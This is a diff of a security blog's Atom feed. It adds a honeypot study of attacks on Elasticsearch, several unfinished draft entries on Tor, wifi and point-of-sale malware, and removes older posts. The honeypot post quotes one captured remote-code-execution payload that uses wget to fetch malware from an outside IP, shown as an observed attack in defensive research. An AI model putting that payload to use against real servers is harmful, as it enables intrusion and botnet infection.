@@ -4,7 +4,7 @@
   <title><![CDATA[jordan-wright]]></title>
   <link href="http://jordan-wright.github.io/atom.xml" rel="self"/>
   <link href="http://jordan-wright.github.io/"/>
-  <updated>2015-05-10T11:25:22-05:00</updated>
+  <updated>2015-05-10T20:02:14-05:00</updated>
   <id>http://jordan-wright.github.io/</id>
   <author>
     <name><![CDATA[Jordan]]></name>
@@ -12,6 +12,141 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[60 Days of Watching Hackers Attack Elasticsearch]]></title>
+    <link href="http://jordan-wright.github.io/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch/"/>
+    <updated>2015-05-11T17:00:00-05:00</updated>
+    <id>http://jordan-wright.github.io/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch</id>
+    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/elk_results.png"/></p>
+
+<h3>Introduction</h3>
+
+<p>Two months ago, one of my DigitalOcean instances started attacking another host with massive amounts of bogus traffic. I was notified by the abuse team at DO that my VPS was participating in a DDoS attack. I managed to track down that the attackers leveraged an <a href="http://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/">RCE vulnerability in Elasticsearch</a> to automatically download and run malware.</p>
+
+<p>After re-building the box from scratch (with many improvements!), I <a href="http://jordan-wright.github.io/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/">created a honeypot</a> called Elastichoney to measure how much this vulnerability is being exploited in the wild. Since then, I&rsquo;ve had multiple sensors silently logging all attempts to exploit this vulnerability.</p>
+
+<p>Here are the results.</p>
+
+<!--more-->
+
+
+<h3>Who&rsquo;s Attacking Me?</h3>
+
+<p><a href="https://github.com/jordan-wright/elastichoney">Elastichoney</a> keeps track of quite a bit of data, including the source IP and payload sent to the sensor. I logged every attack to an Elasticsearch instance (have some irony &ndash; free of charge!) and enriched the data with geoip information using Logstash. Finally, I created a slick dashboard using Kibana to view the results.</p>
+
+<p>So far, I&rsquo;ve had around 8k attempts to attack the honeypots from over 300 unique IP addresses. One of the immediate things I noticed was thing a vast majority (over 93%) of attacks were coming from Chinese IP addresses:</p>
+
+<p><img src="http://jordan-wright.github.io/images/blog/elastichoney_elk/map.png"/></p>
+
+<p>The second thing that I noticed was how fast the majority of exploit attempts died down. Here&rsquo;s a histogram of attack attempts since the sensors have been running:</p>
+
+<p><img src="http://jordan-wright.github.io/images/blog/elastichoney_elk/histogram.png"/></p>
+
+<p>You&rsquo;ll notice a spike between March 20<sup>th</sup> and April 11<sup>th</sup>. These attacks came from a few Chinese IP addresses that all stopped their attacks at the same time. But hey, attacks come in, attacks go out. <a href="http://cdn.meme.am/instances/500x/58834359.jpg">You can&rsquo;t explain that.</a></p>
+
+<h3>What are the Attackers Doing?</h3>
+
+<p>I mentioned that Elastichoney logs the payload sent to the sensor. In some cases, these were attempts to run boring commands like <code>whoami</code>, etc. However, in quite a few cases, the malware attempted to use <code>wget</code> to download and run malware &ndash; similar to what happened to my DO instance.</p>
+
+<p>These looked something like this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"wget+-O+/tmp/zuosyn+http://115.28.216.181:995/zuosyn\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>These malware samples were generally nothing more than basic bots. They could be compiled ELF binaries, or simple Perl scripts. While we&rsquo;re working to let Elastichoney automatically download these malware samples, for now the data is in the logs. Speaking of logs&hellip;</p>
+
+<h3>The Raw Data</h3>
+
+<p>I&rsquo;m a fan of open-sourcing as much information as possible if it helps the community. As such, I&rsquo;ve decided to release all the logs I currently have.</p>
+
+<p>You can download the raw JSON logs <a href="http://jordan-wright.github.io/downloads/elastichoney_logs.json.gz">here</a>. Here&rsquo;s an example log to show how the logs are structured&#8217;:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+</pre></td><td class='code'><pre><code class='json'><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="nt">&quot;source&quot;</span><span class="p">:</span> <span class="s2">&quot;222.186.56.46&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;@timestamp&quot;</span><span class="p">:</span> <span class="s2">&quot;2015-05-10T15:44:56.803Z&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;url&quot;</span><span class="p">:</span> <span class="s2">&quot;x.x.x.x:9200/_search?&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;method&quot;</span><span class="p">:</span> <span class="s2">&quot;GET&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;form&quot;</span><span class="p">:</span> <span class="s2">&quot;form_payload&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;payload&quot;</span><span class="p">:</span> <span class="s2">&quot;json_payload&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;headers&quot;</span><span class="p">:</span> <span class="p">{</span>
+</span><span class='line'>        <span class="nt">&quot;user_agent&quot;</span><span class="p">:</span> <span class="s2">&quot;python-requests/2.4.1 CPython/2.7.8 Windows/2003Server&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;host&quot;</span><span class="p">:</span> <span class="s2">&quot;x.x.x.x:9200&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;content_type&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;accept_language&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span>
+</span><span class='line'>    <span class="p">},</span>
+</span><span class='line'>    <span class="nt">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;attack&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;honeypot&quot;</span><span class="p">:</span> <span class="s2">&quot;x.x.x.x&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;@version&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;host&quot;</span><span class="p">:</span> <span class="s2">&quot;127.0.0.1:39642&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;Python Requests&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;os&quot;</span><span class="p">:</span> <span class="s2">&quot;Windows&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;os_name&quot;</span><span class="p">:</span> <span class="s2">&quot;Windows&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;device&quot;</span><span class="p">:</span> <span class="s2">&quot;Other&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;major&quot;</span><span class="p">:</span> <span class="s2">&quot;2&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;minor&quot;</span><span class="p">:</span> <span class="s2">&quot;4&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;geoip&quot;</span><span class="p">:</span> <span class="p">{</span>
+</span><span class='line'>        <span class="nt">&quot;ip&quot;</span><span class="p">:</span> <span class="s2">&quot;222.186.56.46&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;country_code2&quot;</span><span class="p">:</span> <span class="s2">&quot;CN&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;country_code3&quot;</span><span class="p">:</span> <span class="s2">&quot;CHN&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;country_name&quot;</span><span class="p">:</span> <span class="s2">&quot;China&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;continent_code&quot;</span><span class="p">:</span> <span class="s2">&quot;AS&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;region_name&quot;</span><span class="p">:</span> <span class="s2">&quot;04&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;city_name&quot;</span><span class="p">:</span> <span class="s2">&quot;Nanjing&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;latitude&quot;</span><span class="p">:</span> <span class="mf">32.0617</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;longitude&quot;</span><span class="p">:</span> <span class="mf">118.77780000000001</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;timezone&quot;</span><span class="p">:</span> <span class="s2">&quot;Asia/Shanghai&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;real_region_name&quot;</span><span class="p">:</span> <span class="s2">&quot;Jiangsu&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;location&quot;</span><span class="p">:</span> <span class="p">[</span><span class="mf">118.77780000000001</span><span class="p">,</span> <span class="mf">32.0617</span><span class="p">]</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As always, let me know if you have any questions or comments below!</p>
+
+<p>Jordan</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[How Tor Works: Part Two - Relays vs. Bridges]]></title>
@@ -91,6 +226,42 @@
 <p>Jordan</p>
 
 <p><sup>[1] <a href="https://zmap.io/paper.pdf">https://zmap.io/paper.pdf</a></sup></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[How Tor Works Part Three - The Consensus]]></title>
+    <link href="http://jordan-wright.github.io/blog/2015/05/01/how-tor-works-part-three-the-consensus/"/>
+    <updated>2015-05-01T17:58:00-05:00</updated>
+    <id>http://jordan-wright.github.io/blog/2015/05/01/how-tor-works-part-three-the-consensus</id>
+    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/how_tor_works_2.png"/></p>
+
+<h3>Introduction</h3>
+
+<p>Welcome to the third post in my series on how Tor works! In the past two posts, we talked about how clients tunnel traffic through relays, as well as introduced the idea of bridges.</p>
+
+<p>But how do clients know what relays are active? How is the Tor network actually organized? This post will take a look at</p>
+
+<h3>Respect My Authoritah</h3>
+
+<h3>I Made a Poster</h3>
+
+<p>Here it is:</p>
+
+<p><a href="http://jordan-wright.github.io/images/blog/how_tor_works/consensus.png"><img src="http://jordan-wright.github.io/images/blog/how_tor_works/consensus_small.png"/></a></p>
+
+<h3>Next Steps</h3>
+
+<p>You&rsquo;ll notice that we haven&rsquo;t really covered exit relays. These relays hold a very important position in the Tor network, and deserve their own discussion. So, in the next post we&rsquo;ll talk about how exit relays work, and what happens when exit relay operators decide to &ldquo;break bad&rdquo;, or wreak havoc on Tor users.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[What Happens When Tor Exit Nodes Break Bad?]]></title>
+    <link href="http://jordan-wright.github.io/blog/2015/04/30/what-happens-when-tor-exit-nodes-break-bad/"/>
+    <updated>2015-04-30T21:40:00-05:00</updated>
+    <id>http://jordan-wright.github.io/blog/2015/04/30/what-happens-when-tor-exit-nodes-break-bad</id>
+    <content type="html"><![CDATA[
 ]]></content>
   </entry>
   
@@ -1725,6 +1896,50 @@ e= new Vivus('network', {type: 'oneByOne', duration: 30, start: 'inViewport', fo
   </entry>
   
   <entry>
+    <title type="html"><![CDATA[Why You Shouldn't Automatically Connect to Wifi Networks]]></title>
+    <link href="http://jordan-wright.github.io/blog/2015/02/18/dont-connect-to-wifi-automatically/"/>
+    <updated>2015-02-18T18:08:00-06:00</updated>
+    <id>http://jordan-wright.github.io/blog/2015/02/18/dont-connect-to-wifi-automatically</id>
+    <content type="html"><![CDATA[<p>We&rsquo;ve all seen the articles describing the <a href="https://medium.com/matter/heres-why-public-wifi-is-a-public-health-hazard-dd5b8dcb55e6">damage hackers can do to devices</a> in a local coffee shop. These articles generally describe an approach that involves the attacker connecting to the same local wifi network as the user (statistics show Wifi networks named &ldquo;Starbucks&rdquo; are the <em>real</em> APT*).</p>
+
+<p>&ldquo;&rdquo;<em>That&rsquo;s fine</em>&ldquo;&rdquo;, you think, &ldquo;I don&rsquo;t use the coffe shop wifi, so I&rsquo;m just fine.&rdquo; In this post, I&rsquo;ll show you how another seemingly harmless feature &ndash; setting a wifi network to connect automatically &ndash; can backfire, allowing attackers to force you onto their own hostile network.</p>
+
+<h3>What Happens When You Enable Wifi</h3>
+
+<p>Before going into the specifics of the attack, let&rsquo;s talk a little about what happens behind the scenes when you first enable wifi. Connecting to a wifi network</p>
+
+<h3>Karma&rsquo;s a #$%^@!</h3>
+
+<p>* <sup>Not really.</sup></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Attack Sophistication]]></title>
+    <link href="http://jordan-wright.github.io/blog/2015/02/14/attack-sophistication/"/>
+    <updated>2015-02-14T22:23:00-06:00</updated>
+    <id>http://jordan-wright.github.io/blog/2015/02/14/attack-sophistication</id>
+    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/sophistication.png"/>
+<strong><em>Security experts say the company suffered a sophisticated attack&hellip;</em></strong></p>
+
+<p>Another breach.</p>
+
+<h4>All Attacks are &ldquo;Sophisticated&rdquo;</h4>
+
+<h4>What Sophisticated Looks Like</h4>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[How to Download a List of All Registered Domain Names]]></title>
+    <link href="http://jordan-wright.github.io/blog/2015/02/03/how-to-download-a-list-of-all-registered-domain-names/"/>
+    <updated>2015-02-03T19:21:00-06:00</updated>
+    <id>http://jordan-wright.github.io/blog/2015/02/03/how-to-download-a-list-of-all-registered-domain-names</id>
+    <content type="html"><![CDATA[
+]]></content>
+  </entry>
+  
+  <entry>
     <title type="html"><![CDATA[SANS Holiday Challenge 2014 - Writeup]]></title>
     <link href="http://jordan-wright.github.io/blog/2015/01/05/sans-holiday-challenge-2014-writeup/"/>
     <updated>2015-01-05T07:15:00-06:00</updated>
@@ -2139,6 +2354,25 @@ e= new Vivus('network', {type: 'oneByOne', duration: 30, start: 'inViewport', fo
   </entry>
   
   <entry>
+    <title type="html"><![CDATA[How Cloudflare Finds Your DNS Records]]></title>
+    <link href="http://jordan-wright.github.io/blog/2015/01/01/how-cloudflare-finds-your-dns-records/"/>
+    <updated>2015-01-01T23:28:00-06:00</updated>
+    <id>http://jordan-wright.github.io/blog/2015/01/01/how-cloudflare-finds-your-dns-records</id>
+    <content type="html"><![CDATA[<h3>Introduction</h3>
+
+<p>I&rsquo;ve been starting some research into how an attacker could find the real IP address of a server protected by DDoS protection services such as Cloudflare. The first part of this process is to, of course, sign up for these services so that I have a test environment to work with.</p>
+
+<p>Since Cloudflare&rsquo;s free service is notoriously popular with malicious DDoS-for-hire sites, it was first up. I&rsquo;ll blog about the research as it progresses, but</p>
+
+<h3>Setting Up the Test</h3>
+
+<h3>The Results</h3>
+
+<h3>Conclusion</h3>
+]]></content>
+  </entry>
+  
+  <entry>
     <title type="html"><![CDATA[Why Deleting Sensitive Information from Github Doesn't Save You]]></title>
     <link href="http://jordan-wright.github.io/blog/2014/12/30/why-deleting-sensitive-information-from-github-doesnt-save-you/"/>
     <updated>2014-12-30T19:19:00-06:00</updated>
@@ -2185,6 +2419,27 @@ e= new Vivus('network', {type: 'oneByOne', duration: 30, start: 'inViewport', fo
 <p>Be smart &ndash; protect your data.</p>
 
 <p>-Jordan (<a href="https://twitter.com/jw_sec">@jw_sec</a>)</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Writing Point-of-Sale (PoS) Malware in Python]]></title>
+    <link href="http://jordan-wright.github.io/blog/2014/12/29/writing-a-memory-scraper-in-python/"/>
+    <updated>2014-12-29T21:32:00-06:00</updated>
+    <id>http://jordan-wright.github.io/blog/2014/12/29/writing-a-memory-scraper-in-python</id>
+    <content type="html"><![CDATA[<h3>Introduction</h3>
+
+<p>I&rsquo;ve <a href="http://jordan-wright.github.io/blog/2014/12/28/what-infosec-learned-in-2014/">written before</a> that memory scraping malware is not complex. I&rsquo;ve decided to elaborate on this thought by showing just how easy it is to write a basic memory scraper in Python. It&rsquo;s my hope that, in 30 short lines of Python, you&rsquo;ll realize just how simple this type of malware is.</p>
+
+<h3>Disclaimer</h3>
+
+<blockquote><p>I should note that this post is only meant to highlight just how simple this type of malware is. It should go without saying that this information is in no way meant to be used for illegitimate means. Don&rsquo;t be a jerk.</p></blockquote>
+
+<h3>POS Malware 101</h3>
+
+<h3>Re-creating in Python</h3>
+
+<p>We can use the excellent <code>ctypes</code> library to utilize</p>
 ]]></content>
   </entry>
   
@@ -2267,6 +2522,54 @@ e= new Vivus('network', {type: 'oneByOne', duration: 30, start: 'inViewport', fo
   </entry>
   
   <entry>
+    <title type="html"><![CDATA[Monitoring for Bad Tor Exit Relays Using ExitMap]]></title>
+    <link href="http://jordan-wright.github.io/blog/2014/12/27/monitoring-for-bad-tor-exit-relays-using-exitmap/"/>
+    <updated>2014-12-27T15:04:00-06:00</updated>
+    <id>http://jordan-wright.github.io/blog/2014/12/27/monitoring-for-bad-tor-exit-relays-using-exitmap</id>
+    <content type="html"><![CDATA[<h3>Introduction</h3>
+
+<p>Tor puts quite a bit of power in the hands of exit relays.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Book Review: Black Hat Python]]></title>
+    <link href="http://jordan-wright.github.io/blog/2014/12/20/book-review-black-hat-python/"/>
+    <updated>2014-12-20T12:34:00-06:00</updated>
+    <id>http://jordan-wright.github.io/blog/2014/12/20/book-review-black-hat-python</id>
+    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/blackhat_python.png"/></p>
+
+<blockquote><p><div>Black Hat Python starts slow, but excels with Seitz&rsquo;s deep knowledge of Windows API hooking libraries.</div>
+<span class="fa fa-star"></span><span class="fa fa-star"></span><span class="fa fa-star"></span><span class="fa fa-star"></span><span class="fa fa-star-o"></span></p></blockquote>
+
+<h3>Introduction</h3>
+
+<p>I was excited to read <a href="http://www.amazon.com/Black-Hat-Python-Programming-Pentesters/dp/1593275900/">Black Hat Python: Python Programming for Hackers and Pentesters</a> by Justin Seitz.</p>
+
+<!--more-->
+
+
+<h3>Chapters 1 Through 5: Basics and Web App Hacking</h3>
+
+<p>This book starts slow. A good amount of readable networking basics.
+Scapy is used &ndash; that&rsquo;s nice.
+No <code>requests</code>? No <code>beautifulsoup</code>?</p>
+
+<h3>Chapter 6: Extending Burp Proxy</h3>
+
+<h3>Chapter 7: GitHub Command and Control</h3>
+
+<p>I have written about reusing existing tools in the past (raidersec link)</p>
+
+<h3>Chapters 8 Through 10: Windows API Automation</h3>
+
+<h3>Chapter 11: Automating Offensive Forensics</h3>
+
+<p>I was happy to see strong mention and use of the Volatity framework.</p>
+]]></content>
+  </entry>
+  
+  <entry>
     <title type="html"><![CDATA[What Happens if Tor Directory Authorities are Seized?]]></title>
     <link href="http://jordan-wright.github.io/blog/2014/12/19/what-happens-if-tor-directory-authorities-are-seized/"/>
     <updated>2014-12-19T18:43:00-06:00</updated>
@@ -2323,1339 +2626,6 @@ e= new Vivus('network', {type: 'oneByOne', duration: 30, start: 'inViewport', fo
 <p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
 
 <p><em>*It is worth noting that I am by no means a Tor expert, and am relying on knowledge gained from <a href="http://jordan-wright.github.io/blog/2014/10/06/creating-tor-hidden-services-with-python/">previous</a> <a href="http://raidersec.blogspot.com/2013/09/mapping-tor-relays-and-exit-nodes.html">research</a> into the Tor network structure.</em></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Chrome Tracks Every Key Typed into the Omnibox]]></title>
-    <link href="http://jordan-wright.github.io/blog/2014/12/18/chrome-tracks-every-key-typed-into-omnibox/"/>
-    <updated>2014-12-18T23:43:00-06:00</updated>
-    <id>http://jordan-wright.github.io/blog/2014/12/18/chrome-tracks-every-key-typed-into-omnibox</id>
-    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/browser_tracking.png"/></p>
-
-<blockquote><p>Friendly Reminder: Browser makers may track every key you type in the URL bar</p></blockquote>
-
-<h3>Introduction</h3>
-
-<p>Technologies like Google Chrome&rsquo;s Omnibox makes searching easier. However, these quick search suggestions come at a price. This post is a friendly reminder that you may want to consider turning off predictive search to protect your privacy.</p>
-
-<!--more-->
-
-
-<h3>How the Omnibox Works</h3>
-
-<p>Predictive search isn&rsquo;t magic. Chrome doesn&rsquo;t come shipped with a built-in collection of popular searches. No, the only way to get suggestions for what you are searching is to <em>ask Google</em>. This happens by sending a request to Google for search suggestions <strong>for every key typed in the omnibox</strong> &ndash; by default.</p>
-
-<p>What does this look like? After installing Burp&rsquo;s CA certificate and starting <code>chrome.exe</code> with the <code>--allow-ssl-mitm-proxies</code> option, we can see the following requests pop up as we search:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=o
-</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=om
-</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omg
-</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgw
-</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwt
-</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwtf
-</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwtfb
-</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwtfbb
-</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwtfbbq</span></code></pre></td></tr></table></div></figure>
-
-
-<blockquote><p><em>But I&rsquo;m searching these things anyway!</em></p></blockquote>
-
-<p>Sure, this might be fine for searches, but what else could be sent via this method? Hostnames, web addresses, and IP addresses are <strong><em>all</em></strong> sent to Google before you press enter. This means that Google knows if you visit a website, even if you don&rsquo;t visit the site from search results.</p>
-
-<h4>Disabling Omnibox</h4>
-
-<p>Since this setting is enabled by default, here&rsquo;s how to disable it:</p>
-
-<p><span class="fa-stack fa-lg fa-1x">
-<i class="fa fa-circle fa-stack-2x" style="color:#019875"></i>
-<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">1</i>
-</span> Navigate to <code>chrome://settings</code></p>
-
-<p><span class="fa-stack fa-lg fa-1x">
-<i class="fa fa-circle fa-stack-2x" style="color:#019875"></i>
-<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">2</i>
-</span> Click &ldquo;Show Advanced Settings&rdquo;</p>
-
-<p><span class="fa-stack fa-lg fa-1x">
-<i class="fa fa-circle fa-stack-2x" style="color:#019875"></i>
-<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">3</i>
-</span> Uncheck &ldquo;Use a prediction service to help complete searches&hellip;&rdquo;</p>
-
-<p><img src="http://jordan-wright.github.io/images/blog/browser_track/omnibox.png"/></p>
-
-<h3>Chrome Isn&rsquo;t the Only One</h3>
-
-<p>It&rsquo;s important to note that Chrome isn&rsquo;t the only browser that has this capability. Internet Explorer has the same feature from Bing. The only difference is that this isn&rsquo;t default behavior, and has to be explicitly enabled.</p>
-
-<h3>Putting Things in Perspective</h3>
-
-<p>This isn&rsquo;t new information &ndash; more of a friendly reminder. It&rsquo;s important to put these privacy &ldquo;risks&rdquo; in perspective and determine what is more important to you &ndash; keeping your browsing history and IP/hostname scheme private, or getting solid search suggestions.</p>
-
-<p>As always, let me know if you have any questions/comments below.</p>
-
-<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[My (Probably Boring) Research Papers on Security]]></title>
-    <link href="http://jordan-wright.github.io/blog/2014/12/02/my-probably-boring-research-papers-on-security/"/>
-    <updated>2014-12-02T22:50:00-06:00</updated>
-    <id>http://jordan-wright.github.io/blog/2014/12/02/my-probably-boring-research-papers-on-security</id>
-    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/papers.png"/></p>
-
-<h3>Introduction</h3>
-
-<p>I&rsquo;ve always been a proponent and contributor of open-source projects and information. I strongly believe that information and knowledge should be shared as much and as freely as possible &ndash; progress happens this way.</p>
-
-<p>As such, I&rsquo;ve decided to &ldquo;open-source&rdquo;, if you will, the academic essays I wrote regarding information security and software development my last couple of semesters at Texas Tech. It&rsquo;s my hope that people find these useful, either by provoking thought and discussion or simply by serving as material to help people fall asleep a little easier.</p>
-
-<p>Please bear in mind some of these papers were written <del>the night before</del> in a short time-span.</p>
-
-<!--more-->
-
-
-<h3>The Papers</h3>
-
-<p>Here are the papers (in no particular order):</p>
-
-<ul>
-<li><a href="https://www.dropbox.com/s/y7mz05n47zs71qu/A%20Systems%20Analysis%20of%20the%20Cybercrime%20Industry.pdf?dl=0"><em>A Systems Analysis of the Cybercrime Industry</em></a> &ndash; A formal systems analysis of the current cybercrime industry, showing how this industry is similar to &ldquo;a market for lemons&rdquo;.</li>
-<li><a href="https://www.dropbox.com/s/rvk6ybbl85zce00/The%20Fault%20Tolerance%20of%20Botnets.pdf?dl=0"><em>The Fault Tolerance of Botnets</em></a> &ndash; Studying fault tolerant models of botnets</li>
-<li><a href="https://www.dropbox.com/s/jy8v6tmsjyr65z5/The%20State%20of%20Email%20Security.pdf?dl=0"><em>The State of Email Security</em></a> &ndash; A study regarding the history and current state of email threats and subsequent security mitigations.</li>
-<li><a href="https://www.dropbox.com/s/db2tbau0jdv9pym/Paradigm%20Exercise.pdf?dl=0"><em>Paradigm Shift in Software Development</em></a> &ndash; A brief look into how the creation and establishment of the OSS movement created a paradigm shift in software development methodologies.</li>
-</ul>
-
-
-<p>As always, let me know if you have any questions or comments below! It is worth noting that I do my best to provide the best attribution possible, but if you find mistakes please let me know and I will correct it immediately.</p>
-
-<p>Enjoy!</p>
-
-<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Reverse Engineering the We Heart It API]]></title>
-    <link href="http://jordan-wright.github.io/blog/2014/10/12/reverse-engineering-the-we-heart-it-api/"/>
-    <updated>2014-10-12T20:40:00-05:00</updated>
-    <id>http://jordan-wright.github.io/blog/2014/10/12/reverse-engineering-the-we-heart-it-api</id>
-    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/weheartit_api.png"/></p>
-
-<h3>Introduction</h3>
-
-<p>A while back, I came across the article from the The Washington Post describing We Heart It, a social network claiming <a href="http://www.washingtonpost.com/news/the-intersect/wp/2014/05/07/30-million-people-use-this-social-network-and-youve-probably-never-heard-of-it/">over 30 million users</a>. If you haven&rsquo;t seen it, <a href="http://weheartit.com">We Heart It</a> (from here on out abbreviated as WHI) is a social network which encourages people to post and share photos and images of things that inspire them.</p>
-
-<p>Having such a large user-base, I was interested in seeing what kind of API the site offered developers. However, I was disappointed when I found out that the API was <a href="https://weheartit.com/partners">closed to &ldquo;partners&rdquo;</a>, and even this is not a full REST API, but rather a simple button developers can place on their website to allow users to interact with WHI.</p>
-
-<p>With this being the case, I decided to take a look at the Android and iPhone apps using both static and dynamic analysis in an experiment to see if I could reverse engineer the API used on the backend. Here are the results.</p>
-
-<!--more-->
-
-
-<h3>Dynamic Analysis</h3>
-
